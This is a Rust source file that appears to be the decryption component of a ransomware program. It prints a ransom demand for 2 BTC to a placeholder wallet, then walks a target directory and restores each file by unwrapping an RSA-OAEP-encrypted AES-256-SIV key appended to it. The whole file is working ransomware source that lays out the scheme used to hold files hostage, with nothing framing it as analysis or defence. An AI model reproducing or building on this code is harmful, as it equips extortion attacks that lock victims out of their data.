use aes_siv::{
    aead::{generic_array::GenericArray, KeyInit, Aead},

    Aes256SivAead,
    Nonce,
    Error as AesError // Or `Aes128SivAead`
};
use rsa::{RsaPrivateKey , Oaep, errors::Error as RsaError, pkcs8::DecodePrivateKey};
use sha2::{Sha256, digest::InvalidLength};
use std::io::{Read , Error as IOError, stdin , stdout , Write};
use std::path::Path;
use std::fs::{File, write};
use walkdir::WalkDir;
use thiserror::Error;
use typenum::U16;

#[derive(Error, Debug)]
enum CipherError {
    #[error("IO error")]
    IOError(#[from] IOError),
    #[error("Wrong reading")]
    InvalidLength(InvalidLength),
    #[error("Aes encryption Error")]
    AesError(AesError),
    #[error("Rsa encryption Error")]
    RsaError(#[from] RsaError)
}

fn decrypt_file(path: &Path , rsa_key : &RsaPrivateKey) -> Result<(), CipherError> {
    match File::options().read(true).write(true).open(path) {
        Ok(mut file) => {
            let mut buffer = Vec::<u8>::new();
            let mut buffer_nonce = [0 ; 16];

            file.read_exact(&mut buffer_nonce)?;
            file.read_to_end(&mut buffer)?;

            let final_length = buffer.len().saturating_sub(512);

            let encrypted_aes_key_bytes = buffer.split_off(final_length);
            
            let padding = Oaep::new::<Sha256>();

            let aes_key = rsa_key.decrypt(padding, &encrypted_aes_key_bytes)?;

            let nonce: GenericArray<u8, U16> = Nonce::clone_from_slice(&buffer_nonce);
            let cipher : Result<Aes256SivAead, InvalidLength> = Aes256SivAead::new_from_slice(&aes_key);

            if let Err(err) = cipher {
                return Err(CipherError::InvalidLength(err));
            }

            let cipher = cipher.unwrap();

            let decrypted_file = cipher.decrypt(&nonce , buffer.as_slice());

            if let Err(error) = decrypted_file{
                println!("{:?}" , error.to_string());
                return Err(CipherError::AesError(error));
            }

            let decrypted_file: Vec<u8> = decrypted_file.unwrap();

            Ok(write(path , decrypted_file)?)
        }
        Err(error) => Err(CipherError::IOError(error)),
    }
}

fn pause() {
    let mut stdout = stdout();
    stdout.write(b"Press enter to continue...").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}

fn main() {
    let wallet = "my_wallet";
    println!(
        "Your data is kidnnaped by a ransomware Hihihaha, pay 2 BTC to this wallet : {}",
        wallet
    );

    pause();

    let rsa_key = RsaPrivateKey::read_pkcs8_pem_file("./key.pem").expect("no private key found");

    for entry in WalkDir::new("./some_target_dir")
        .into_iter()
        .filter_map(|e| e.ok())
    {
        if entry.metadata().unwrap().is_file() {
            let path = entry.path();
            decrypt_file(path, &rsa_key).ok();
        }
    }
}
